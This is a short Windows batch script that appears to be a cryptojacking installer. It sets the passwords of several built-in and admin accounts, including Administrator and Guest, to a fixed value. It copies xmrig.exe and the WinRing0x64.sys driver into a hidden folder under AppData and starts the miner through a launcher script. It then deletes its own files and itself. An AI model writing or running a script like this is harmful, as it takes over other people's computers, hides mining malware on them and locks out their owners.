@echo off
net user admin   xroot11
net user cloudbase-init xroot11
net user WDAGUtilityAccount xroot11
net user Administrator  xroot11
net user Guest  xroot11
net user DefaultAccount xroot11
net user DefaultAdmin xroot11
net user LocalAdmin xroot11


mkdir %appdata%\Microsoft\Windows\temp
start setup.reg
copy start.bat %appdata%\Microsoft\Windows\temp
copy WinRing0x64.sys %appdata%\Microsoft\Windows\temp
copy xmrig.exe %appdata%\Microsoft\Windows\temp
attrib +s +h %appdata%\Microsoft\Windows\temp\*
start %appdata%\Microsoft\Windows\temp\start.bat
del /q setup.reg
del /q start.bat
del /q WinRing0x64.sys
del /q xmrig.exe
del /q script.bat
